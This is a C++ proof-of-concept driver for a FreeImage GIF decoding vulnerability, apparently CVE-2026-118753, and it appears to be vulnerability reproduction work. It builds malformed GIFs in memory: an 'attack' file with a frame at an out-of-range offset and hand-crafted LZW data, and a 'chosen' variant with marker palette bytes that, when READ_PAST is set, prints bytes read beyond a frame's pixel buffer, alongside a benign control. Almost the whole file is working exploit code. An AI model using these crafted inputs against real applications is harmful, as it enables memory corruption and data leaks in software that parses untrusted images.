/*
 * Public-API FreeImage GIF_PLAYBACK driver for CVE-2026-118753.
 * Builds the GIF bytes locally; no external corpus or network access.
 */
#include "FreeImage.h"

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

static void u16(std::vector<BYTE> &gif, unsigned v) {
    gif.push_back(static_cast<BYTE>(v));
    gif.push_back(static_cast<BYTE>(v >> 8));
}

static void gce(std::vector<BYTE> &gif, BYTE disposal) {
    const BYTE b[] = {0x21, 0xF9, 0x04, disposal, 0, 0, 0, 0};
    gif.insert(gif.end(), b, b + sizeof(b));
}

static void lzw_clear_pixels(std::vector<BYTE> &codes,
                             const std::vector<BYTE> &pixels) {
    unsigned acc = 0;
    unsigned nbits = 0;
    auto emit = [&](unsigned code) {
        acc |= code << nbits;
        nbits += 9;
        while (nbits >= 8) {
            codes.push_back(static_cast<BYTE>(acc));
            acc >>= 8;
            nbits -= 8;
        }
    };
    for (BYTE p : pixels) {
        emit(256); // clear, so the dictionary never grows and 9 bits suffice
        emit(p);
    }
    emit(257); // end
    if (nbits) codes.push_back(static_cast<BYTE>(acc));
}

static void frame(std::vector<BYTE> &gif, unsigned left, unsigned top,
                  unsigned width, unsigned height,
                  const std::vector<BYTE> &pixels) {
    gif.push_back(0x2C);
    u16(gif, left);
    u16(gif, top);
    u16(gif, width);
    u16(gif, height);
    gif.push_back(0); // no local color table
    gif.push_back(8); // LZW minimum code size
    std::vector<BYTE> codes;
    lzw_clear_pixels(codes, pixels);
    for (size_t off = 0; off < codes.size(); off += 255) {
        const size_t n = std::min<size_t>(255, codes.size() - off);
        gif.push_back(static_cast<BYTE>(n));
        gif.insert(gif.end(), codes.begin() + off, codes.begin() + off + n);
    }
    gif.push_back(0);
}

static void raw_frame(std::vector<BYTE> &gif, unsigned left, unsigned top,
                     unsigned width, unsigned height,
                     const std::vector<BYTE> &compressed) {
    gif.push_back(0x2C);
    u16(gif, left);
    u16(gif, top);
    u16(gif, width);
    u16(gif, height);
    gif.push_back(0);
    gif.push_back(2);
    gif.push_back(static_cast<BYTE>(compressed.size()));
    gif.insert(gif.end(), compressed.begin(), compressed.end());
    gif.push_back(0);
}

static std::vector<BYTE> header(unsigned palette_entries) {
    std::vector<BYTE> gif = {'G', 'I', 'F', '8', '9', 'a'};
    u16(gif, 10);
    u16(gif, 10);
    unsigned packed = 0x80;
    if (palette_entries == 256) packed |= 7;
    gif.push_back(static_cast<BYTE>(packed));
    gif.push_back(0); // background index
    gif.push_back(0); // aspect
    return gif;
}

static std::vector<BYTE> upstream_attack() {
    std::vector<BYTE> gif = header(2);
    const BYTE pal[] = {0, 0, 0, 255, 255, 255};
    gif.insert(gif.end(), pal, pal + sizeof(pal));
    gce(gif, 0x08);
    raw_frame(gif, 8, 0, 5, 1, {0x0C, 0xC3, 0x30, 0x4C, 0x01});
    gce(gif, 0x08);
    raw_frame(gif, 60000, 1, 1, 1, {0x4C, 0x01});
    gce(gif, 0);
    raw_frame(gif, 0, 2, 1, 1, {0x4C, 0x01});
    gif.push_back(0x3B);
    return gif;
}

static std::vector<BYTE> safe_gif() {
    std::vector<BYTE> gif = header(2);
    const BYTE pal[] = {0, 0, 0, 255, 255, 255};
    gif.insert(gif.end(), pal, pal + sizeof(pal));
    gce(gif, 0x08);
    frame(gif, 8, 0, 2, 1, {1, 1});
    gce(gif, 0x08);
    frame(gif, 9, 1, 1, 1, {1});
    gce(gif, 0);
    raw_frame(gif, 0, 2, 1, 1, {0x4C, 0x01});
    gif.push_back(0x3B);
    return gif;
}
static std::vector<BYTE> chosen_gif() {
    std::vector<BYTE> gif = header(256);
    for (unsigned i = 0; i < 256; ++i) {
        BYTE rgb[3] = {static_cast<BYTE>(i), static_cast<BYTE>(i ^ 0x5a),
                       static_cast<BYTE>(i ^ 0xa5)};
        if (i == 0) std::memcpy(rgb, "HZM", 3);
        if (i == 1) std::memcpy(rgb, "TAU", 3);
        gif.insert(gif.end(), rgb, rgb + 3);
    }
    gce(gif, 0x08);
    raw_frame(gif, 8, 0, 5, 1, {0x0C, 0xC3, 0x30, 0x4C, 0x01});
    gce(gif, 0x08);
    raw_frame(gif, 60000, 1, 1, 1, {0x4C, 0x01});
    gce(gif, 0);
    raw_frame(gif, 0, 2, 1, 1, {0x4C, 0x01});
    gif.push_back(0x3B);
    return gif;
}

static int fail(const char *what) {
    std::fprintf(stderr, "FAIL: %s\n", what);
    return 1;
}

static int replay(std::vector<BYTE> bytes, const char *mode) {
    FreeImage_Initialise();
    FIMEMORY *mem = FreeImage_OpenMemory(bytes.data(), static_cast<DWORD>(bytes.size()));
    if (!mem) return fail("OpenMemory");
    FIMULTIBITMAP *anim = FreeImage_LoadMultiBitmapFromMemory(FIF_GIF, mem, GIF_PLAYBACK);
    if (!anim) {
        FreeImage_CloseMemory(mem);
        FreeImage_DeInitialise();
        return fail("LoadMultiBitmapFromMemory");
    }
    const int pages = FreeImage_GetPageCount(anim);
    std::printf("MODE=%s BYTES=%zu PAGES=%d\n", mode, bytes.size(), pages);
    bool ok = true;
    for (int p = 0; p < pages; ++p) {
        FIBITMAP *dib = FreeImage_LockPage(anim, p);
        if (!dib) { ok = false; break; }
        std::printf("PAGE=%d W=%u H=%u BPP=%u PITCH=%u\n", p,
                    FreeImage_GetWidth(dib), FreeImage_GetHeight(dib),
                    FreeImage_GetBPP(dib), FreeImage_GetPitch(dib));
        if (std::strcmp(mode, "chosen") == 0 && p == 0 && std::getenv("READ_PAST")) {
            BYTE *bits = FreeImage_GetBits(dib);
            std::printf("PAST_PIXELS=");
            for (size_t i = 0; i < 12; ++i)
                std::printf("%02x", bits[400 + i]);
            std::printf("\n");
        }
        FreeImage_UnlockPage(anim, dib, FALSE);
    }
    FreeImage_CloseMultiBitmap(anim, 0);
    FreeImage_CloseMemory(mem);
    FreeImage_DeInitialise();
    if (!ok) return fail("page decode");
    std::puts("RESULT=OK");
    return 0;
}

int main(int argc, char **argv) {
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    if (argc != 2) {
        std::fprintf(stderr, "usage: %s attack|safe|chosen\n", argv[0]);
        return 2;
    }
    if (std::strcmp(argv[1], "attack") == 0) return replay(upstream_attack(), "attack");
    if (std::strcmp(argv[1], "safe") == 0) return replay(safe_gif(), "safe");
    if (std::strcmp(argv[1], "chosen") == 0) return replay(chosen_gif(), "chosen");
    return 2;
}
